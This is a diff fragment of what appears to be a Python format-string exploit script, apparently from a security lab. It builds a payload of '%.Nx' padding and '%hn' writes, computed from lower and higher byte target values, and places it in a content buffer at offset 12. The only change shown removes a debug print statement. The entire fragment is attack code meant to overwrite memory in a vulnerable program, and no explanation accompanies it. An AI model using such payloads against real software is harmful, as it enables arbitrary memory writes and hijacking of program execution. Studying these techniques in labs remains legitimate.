@@ -19,8 +19,6 @@ s += "%." + str(LOWER_BYTES_NEW_VAL_DECIMAL - 12 - 240) + "x" + "%hn"
 s += "%." + str(HIGHER_BYTES_NEW_VAL_DECIMAL -
                 LOWER_BYTES_NEW_VAL_DECIMAL) + "x" + "%hn"
 
-print(s)
-
 fmt = (s).encode('latin-1')
 content[12:12 + len(fmt)] = fmt
 
